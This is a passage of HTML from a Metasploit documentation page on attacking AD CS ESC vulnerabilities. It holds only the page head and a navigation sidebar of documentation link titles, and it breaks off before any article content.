<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><link rel="shortcut icon" href="/assets/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-4622520-7"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-4622520-7', { 'anonymize_ip': true }); </script> <script type="text/javascript" src="/assets/js/vendor/lunr.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mermaid@9.2.2/dist/mermaid.min.js"></script> <script type="text/javascript" src="/assets/js/just-the-docs.js"></script><meta name="viewport" content="width=device-width, initial-scale=1"><title>Attacking AD CS ESC Vulnerabilities Using Metasploit | Metasploit Documentation Penetration Testing Software, Pen Testing Security</title><meta name="generator" content="Jekyll v4.3.1" /><meta property="og:title" content="Attacking AD CS ESC Vulnerabilities Using Metasploit" /><meta property="og:locale" content="en_US" /><meta name="description" content="View Metasploit Framework Documentation" /><meta property="og:description" content="View Metasploit Framework Documentation" /><link rel="canonical" href="https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html" /><meta property="og:url" content="https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html" /><meta property="og:site_name" content="Metasploit Documentation Penetration Testing Software, Pen Testing Security" /><meta property="og:type" content="website" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Attacking AD CS ESC Vulnerabilities Using Metasploit" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebPage","description":"View Metasploit Framework Documentation","headline":"Attacking AD CS ESC Vulnerabilities Using Metasploit","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://rapid7.github.io/metasploit-framework/assets/images/favicon.png"}},"url":"https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html"}</script><body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"><title>Link</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"><title>Search</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"><title>Menu</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"><title>Expand</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"><polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"><title>Document</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <script type="text/javascript" src="/assets/js/toggle_init.js"></script><div class="side-bar"><div class="site-header"> <a href="/" class="site-title lh-tight">Metasploit Documentation </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a></div><nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"><ul class="nav-list"><li class="nav-list-item active"><a href="/" class="nav-list-link">Home</a><li class="nav-list-item active"><a href="/docs/code-of-conduct.html" class="nav-list-link">Code Of Conduct</a><li class="nav-list-item active"><a href="/docs/modules.html" class="nav-list-link">Modules</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/" class="nav-list-link active">Pentesting</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-setting-module-options.html" class="nav-list-link">Setting Module Options</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html" class="nav-list-link">Upgrading Shells to Meterpreter</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-post-gather-modules.html" class="nav-list-link">Post Gather Modules</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-http.html" class="nav-list-link">HTTP + HTTPS</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-kubernetes.html" class="nav-list-link">Kubernetes</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-mysql.html" class="nav-list-link">MySQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-postgresql.html" class="nav-list-link">PostgreSQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-smb.html" class="nav-list-link">SMB</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-ssh.html" class="nav-list-link">SSH</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-winrm.html" class="nav-list-link">WinRM</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-mssql.html" class="nav-list-link">MSSQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-ldap.html" class="nav-list-link">LDAP</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/" class="nav-list-link active">Active Directory</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/ad-certificates/" class="nav-list-link active">AD CS</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/overview.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html" class="nav-list-link active">Attacking AD CS ESC Vulnerabilities Using Metasploit</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/icpr_cert.html" class="nav-list-link">Request certificates</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/ldap_esc_vulnerable_cert_finder.html" class="nav-list-link">Vulnerable cert finder</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/kerberos/" class="nav-list-link">Kerberos</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/overview.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/service_authentication.html" class="nav-list-link">Authenticating to SMB/WinRM/etc</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/kerberos_login.html" class="nav-list-link">Kerberos login enumeration and bruteforcing</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/get_ticket.html" class="nav-list-link">Get Ticket granting tickets and service tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/ticket_converter.html" class="nav-list-link">Converting kirbi and ccache files</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/forge_ticket.html" class="nav-list-link">Forging tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/inspect_ticket.html" class="nav-list-link">Inspecting tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/kerberoasting.html" class="nav-list-link">Kerberoasting</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/keytab.html" class="nav-list-link">Keytab support and decrypting wireshark traffic</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/rbcd.html" class="nav-list-link">RBCD - Resource-based constrained delegation</a></ul></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/" class="nav-list-link">Using Metasploit</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/getting-started/" class="nav-list-link">Getting Started</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/getting-started/nightly-installers.html" class="nav-list-link">Nightly Installers</a><li class="nav-list-item active"><a href="/docs/using-metasploit/getting-started/reporting-a-bug.html" class="nav-list-link">Reporting a Bug</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/basics/" class="nav-list-link">Basics</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/using-metasploit.html" class="nav-list-link">Running modules</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html" class="nav-list-link">How to use a Metasploit module appropriately</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-payloads-work.html" class="nav-list-link">How payloads work</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/module-documentation.html" class="nav-list-link">Module Documentation</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html" class="nav-list-link">How to use a reverse shell in Metasploit</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-msfvenom.html" class="nav-list-link">How to use msfvenom</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/intermediate/" class="nav-list-link">Intermediate</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/metasploit-database-support.html" class="nav-list-link">Database Support</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/evading-anti-virus.html" class="nav-list-link">Evading Anti Virus</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/exploit-ranking.html" class="nav-list-link">Exploit Ranking</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/hashes-and-password-cracking.html" class="nav-list-link">Hashes and Password Cracking</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/payload-uuid.html" class="nav-list-link">Payload UUID</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/pivoting-in-metasploit.html" class="nav-list-link">Pivoting in Metasploit</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/running-private-modules.html" class="nav-list-link">Running Private Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/" class="nav-list-link">Advanced</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/metasploit-web-service.html" class="nav-list-link">Metasploit Web Service</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/meterpreter/" class="nav-list-link">Meterpreter</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html" class="nav-list-link">Configuration</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html" class="nav-list-link">Debugging Dead Meterpreter Sessions</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-debugging-meterpreter-sessions.html" class="nav-list-link">Debugging Meterpreter Sessions</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html" class="nav-list-link">ExecuteBof Command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-http-communication.html" class="nav-list-link">HTTP Communication</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/how-to-get-started-with-writing-a-meterpreter-script.html" class="nav-list-link">How to get started with writing a Meterpreter script</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html" class="nav-list-link">Paranoid Mode</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/powershell-extension.html" class="nav-list-link">Powershell Extension</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/python-extension.html" class="nav-list-link">Python Extension</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-reg-command.html" class="nav-list-link">Reg Command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-reliable-network-communication.html" class="nav-list-link">Reliable Network Communication</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html" class="nav-list-link">Sleep Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html" class="nav-list-link">Stageless Mode</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html" class="nav-list-link">The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html" class="nav-list-link">Timeout Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html" class="nav-list-link">Transport Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-unicode-support.html" class="nav-list-link">Unicode Support</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-wishlist.html" class="nav-list-link">Wishlist</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/RPC/" class="nav-list-link">RPC</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-json-rpc.html" class="nav-list-link">How to use Metasploit JSON RPC</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-messagepack-rpc.html" class="nav-list-link">How to use Metasploit Messagepack RPC</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/other/" class="nav-list-link">Other</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/other/how-to-use-the-favorite-command.html" class="nav-list-link">How to use the Favorite command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/information-about-unmet-browser-exploit-requirements.html" class="nav-list-link">Information About Unmet Browser Exploit Requirements</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/other/oracle-support/" class="nav-list-link">Oracle Support</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html" class="nav-list-link">How to get Oracle Support working with Kali Linux</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/oracle-support/oracle-usage.html" class="nav-list-link">Oracle Usage</a></ul><li class="nav-list-item active"><a href="/docs/using-metasploit/other/why-cve-is-not-available.html" class="nav-list-link">Why CVE is not available</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/" class="nav-list-link">Development</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/get-started/" class="nav-list-link">Get Started</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/get-started/contributing-to-metasploit.html" class="nav-list-link">Contributing to Metasploit</a><li class="nav-list-item active"><a href="/docs/development/get-started/creating-your-first-pr.html" class="nav-list-link">Creating Your First PR</a><li class="nav-list-item active"><a href="/docs/development/get-started/setting-up-a-metasploit-development-environment.html" class="nav-list-link">Setting Up a Metasploit Development Environment</a><li class="nav-list-item active"><a href="/docs/development/get-started/sanitizing-pcaps.html" class="nav-list-link">Sanitizing PCAPs</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/get-started/git/" class="nav-list-link">Git</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/get-started/git/git-reference-sites.html" class="nav-list-link">Git Reference Sites</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/git-cheatsheet.html" class="nav-list-link">Git cheatsheet</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html" class="nav-list-link">Keeping in sync with rapid7 master</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/remote-branch-pruning.html" class="nav-list-link">Remote Branch Pruning</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/using-git.html" class="nav-list-link">Using Git</a></ul><li class="nav-list-item active"><a href="/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html" class="nav-list-link">Navigating the codebase</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/" class="nav-list-link">Developing Modules</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/guides/" class="nav-list-link">Guides</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/guides/scanners/" class="nav-list-link">Scanners</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html" class="nav-list-link">Writing a HTTP LoginScanner</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html" class="nav-list-link">Writing an FTP LoginScanner</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html" class="nav-list-link">How to check Microsoft patch levels for your exploit</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-use-command-stagers.html" class="nav-list-link">How to use command stagers</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-check-method.html" class="nav-list-link">How to write a check method</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-browser-exploit-using-httpserver.html" class="nav-list-link">Writing a browser exploit</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-get-started-with-writing-a-post-module.html" class="nav-list-link">Writing a post module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html" class="nav-list-link">Writing an auxiliary module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/get-started-writing-an-exploit.html" class="nav-list-link">Writing an exploit</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/module-metadata/" class="nav-list-link">Module metadata</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html" class="nav-list-link">Definition of Module Reliability Side Effects and Stability</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html" class="nav-list-link">How to use datastore options</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/module-reference-identifiers.html" class="nav-list-link">Module Reference Identifiers</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/external-modules/" class="nav-list-link">External Modules</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-golang-modules.html" class="nav-list-link">Writing GoLang Modules</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-python-modules.html" class="nav-list-link">Writing Python Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/" class="nav-list-link">Libraries</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/api.html" class="nav-list-link">API</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-msf-auxiliary-authbrute-to-write-a-bruteforcer.html" class="nav-list-link">AuthBrute</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-cleanup-after-module-execution.html" class="nav-list-link">Cleanup</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/c/" class="nav-list-link">Compiling C</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html" class="nav-list-link">Base64 Support</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html" class="nav-list-link">RC4 Support</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html" class="nav-list-link">XOR Support</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/deserialization/" class="nav-list-link">Deserialization</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html" class="nav-list-link">Dot Net Deserialization</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html" class="nav-list-link">Java Deserialization</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html" class="nav-list-link">Fail_with</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-fileformat-mixin-to-create-a-file-format-exploit.html" class="nav-list-link">Fileformat</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-git-mixin-to-write-an-exploit-module.html" class="nav-list-link">Git Mixin</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/http/" class="nav-list-link">HTTP</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-write-a-browser-exploit-using-browserexploitserver.html" class="nav-list-link">BrowserExploitServer</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html" class="nav-list-link">How to Send an HTTP Request Using HttpClient</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html" class="nav-list-link">How to parse an HTTP response</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html" class="nav-list-link">How to send an HTTP request using Rex Proto Http Client</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-write-a-module-using-httpserver-and-httpclient.html" class="nav-list-link">How to write a module using HttpServer and HttpClient</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html" class="nav-list-link">Logging</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/obfuscation/" class="nav-list-link">Obfuscation</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html" class="nav-list-link">C Obfuscation</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html" class="nav-list-link">JavaScript Obfuscation</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-phpexe-to-exploit-an-arbitrary-file-upload-bug.html" class="nav-list-link">PhpExe</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-powershell-in-an-exploit.html" class="nav-list-link">Powershell</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-railgun-for-windows-post-exploitation.html" class="nav-list-link">Railgun</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/using-reflectivedll-injection.html" class="nav-list-link">ReflectiveDLL Injection</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-do-reporting-or-store-data-in-module-development.html" class="nav-list-link">Reporting and Storing Data</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-seh-mixin-to-exploit-an-exception-handler.html" class="nav-list-link">SEH Exploitation</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/smb_library/" class="nav-list-link">SMB Library</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/smb_library/guidelines-for-writing-modules-with-smb.html" class="nav-list-link">Guidelines for Writing Modules with SMB</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/smb_library/what-my-rex-proto-smb-error-means.html" class="nav-list-link">What my Rex Proto SMB Error means</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/sql-injection-libraries.html" class="nav-list-link">SQL Injection</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html" class="nav-list-link">TCP</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-wbemexec-for-a-write-privilege-attack-on-windows.html" class="nav-list-link">WbemExec</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html" class="nav-list-link">Zip</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/google-summer-of-code/" class="nav-list-link">Google Summer of Code</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-mentor-organization-application.html" class="nav-list-link">2017 Mentor Organization Application</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html" class="nav-list-link">2017 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html" class="nav-list-link">2017 Student Proposal</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html" class="nav-list-link">2018 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2019-project-ideas.html" class="nav-list-link">2019 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html" class="nav-list-link">2020 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html" class="nav-list-link">2021 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html" class="nav-list-link">2022 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2023-project-ideas.html" 